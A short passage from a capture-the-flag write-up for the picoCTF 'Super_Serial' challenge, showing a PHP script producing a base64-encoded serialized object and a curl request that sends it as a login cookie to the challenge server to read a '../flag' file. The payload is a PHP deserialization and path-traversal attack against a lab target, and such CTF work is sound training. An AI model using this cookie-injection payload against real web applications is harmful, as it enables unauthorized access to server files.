...
┌──(user@kali)-[/media/sf_CTFs/pico/Super_Serial]
└─$ php -e solve.php
[AWS_SECRET_REMOVED]ZmlsZSI7czo3OiIuLi9mbGFnIjt9
```
...
```console
┌──(user@kali)-[/media/sf_CTFs/pico/Super_Serial]
└─$ curl http://mercury.picoctf.net:3449/authentication.php -H "Cookie: login=[AWS_SECRET_REMOVED]ZmlsZSI7czo3OiIuLi9mbGFnIjt9;"
